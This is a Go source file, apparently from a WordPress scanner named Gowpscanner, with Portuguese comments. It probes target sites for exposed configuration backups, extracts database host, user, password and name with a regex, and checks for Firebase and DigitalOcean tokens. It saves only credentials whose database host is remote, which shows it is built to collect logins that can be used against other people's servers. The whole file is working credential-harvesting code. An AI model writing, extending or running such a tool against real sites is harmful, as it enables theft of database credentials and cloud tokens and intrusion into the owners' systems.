// internal/scanner/backups.go
package scanner

import (
	"fmt"
	"regexp"
	"strings"

	"Gowpscanner/internal/utils"
	"Gowpscanner/internal/wpdetect"
)

// ConfigLists (carregadas em init ou por outro método)
var configList []string
var dbExportsList []string

// CheckConfigBackups verifica se existem arquivos de configuração expostos
func CheckConfigBackups(baseURL string) {
	var contador int = 0
	for _, config := range configList {
		contador++
		// Caso o contador seja múltiplo de 100, exibe mensagem
		if contador%100 == 0 {
			utils.Info("Verificando Backups %s - %d/%d", baseURL, contador, len(configList))
		}
		urlConfig := fmt.Sprintf("%s/%s", baseURL, config)
		conteudo, err := utils.GetBody(urlConfig)
		if err != nil {
			continue
		}

		// Verifica se contém DB_NAME
		if strings.Contains(conteudo, "DB_NAME") {
			utils.LogSave(urlConfig, "configuracoes.txt")
			utils.BeepAlert()
			utils.Warning("Configuração %s encontrada em %s", config, baseURL)
		}

		wpdetect.CheckFirebaseIO(conteudo)
		wpdetect.CheckDigitalOceanToken(conteudo)

		// Remove espaços em branco (se necessário para outras verificações, ex.: SMTP)
		conteudo = strings.ReplaceAll(conteudo, " ", "")

		// Extraindo os valores das configurações desejadas
		configValues := extractConfigValues(conteudo)
		if len(configValues) > 0 {
			utils.Info("Configurações encontradas em %s:", urlConfig)

			// Monta a string com os valores extraídos
			var configOutput string
			configOutput += fmt.Sprintf("URL: %s", urlConfig)
			for campo, valor := range configValues {
				linha := fmt.Sprintf("  %s: %s", campo, valor)
				utils.Info(linha)
				configOutput += linha
			}

			// Verifica se DB_HOST possui valor "localhost" ou "127.0.0.1"
			if host, ok := configValues["DB_HOST"]; ok && (host == "localhost" || host == "localhost:3306" || host == "127.0.0.1" || host == "127.0.0.1:3306" || host == "127.0.0.1:8889") {
				// Não salva se o DB_HOST for local
				utils.Info("DB_HOST é %s, dados não serão salvos em mysqlconfigs.txt", host)
			} else {
				// Salva os valores encontrados no arquivo mysqlconfigs.txt
				utils.LogSave(configOutput, "mysqlconfigs.txt")
			}
		}
	}
}

// extractConfigValues extrai os valores dos campos DB_HOST, DB_USER, DB_PASSWORD e DB_NAME
func extractConfigValues(conteudo string) map[string]string {
	// Expressão regular para capturar os valores das definições
	regexPattern := `define\(\s*['"](?P<campo>DB_HOST|DB_USER|DB_PASSWORD|DB_NAME)['"]\s*,\s*['"](?P<valor>[^'"]+)['"]\s*\)`
	re := regexp.MustCompile(regexPattern)
	matches := re.FindAllStringSubmatch(conteudo, -1)

	configMap := make(map[string]string)
	for _, match := range matches {
		// match[0] = string completa; match[1] = campo; match[2] = valor
		if len(match) >= 3 {
			configMap[match[1]] = match[2]
		}
	}
	return configMap
}
